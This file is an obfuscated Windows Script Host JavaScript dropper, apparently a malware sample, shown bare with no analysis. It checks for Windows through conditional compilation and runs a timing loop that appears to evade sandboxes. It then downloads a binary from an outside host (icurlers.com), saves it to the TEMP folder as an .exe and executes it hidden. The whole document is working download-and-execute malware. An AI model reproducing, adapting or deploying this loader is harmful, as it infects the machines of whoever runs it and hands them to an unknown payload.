var Ti = false;
var Tp = "CreateObject";
var p = function nk() {return WScript[Tp]("WScript.Shell");}(), L = 11;
var s0 = "MSXML2.XMLHTTP";
var LJ = 2123213;
var E = 0;
function zm(l0){p["Run"](l0, E, E);};
function jo(){return "" + s0;};
function K(Hg, lf){E = E * 1; return Hg - lf;};
function RD(){return Tp;};
/*@cc_on
  @if (@_win32 || @_win64)
    Ti = true;
  @end
@*/
if (Ti)
{
var h = "";
function ZV(){return 22;};
var F1 = 0; var Bd = 0;
function rb()
{
var F0 = new this["Date"]();
var s = F0["getUTCMilliseconds"]();
WScript["Sleep"](ZV());
var F0 = new this["Date"]();
var Oo = F0["getUTCMilliseconds"]();
WScript["Sleep"](ZV());
var F0 = new this["Date"]();
var j = F0["getUTCMilliseconds"]();
var F1 = "qG";
F1 = K(Oo, s);
var Bd = "RM";
Bd = K(j, Oo);
h = "open";
return K(F1, Bd);
}
var Q = false;
var O = false;
for (var cd = E; cd < ZV() * 1; cd++){if (rb() != E){
Q = true; 
Bd = "31" + 11 * F1 + Bd; 
O = true; 
break;
}}
function Ib() {return ((Q == true) && (Q == O)) ? 1 : E;};
if (Q && Ib() && O){
function I() {return p["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ykEHY0YuCLr.exe";};
 Db = jo();
 O0 = WScript[Tp](Db);
 var Eq = 1;
 while (Eq){
try {
O0[h]("GET", "http://icurlers.com/sodp1os", false);
O0["send"]();
dw = "Sleep";
for (;;){WScript[dw](ZV() * 11); if (O0["readystate"] >= 2 * 2) break;};
Eq = E;
} catch(pr){};
}
function F(b) {var y = (1, 2, 3, 4, 5, b); return y;};
Ae = WScript[RD()]("ADODB.Stream");
Db = Ae;
Db[h]();
Db["type"] = F(1);
Db["write"](O0["ResponseBody"]);
Ae["position"] = F(E);
Db["Save" + "ToFile"](I(), 2);
Ae["c"+"lose"]();
l = I();
zm(l);
}
}

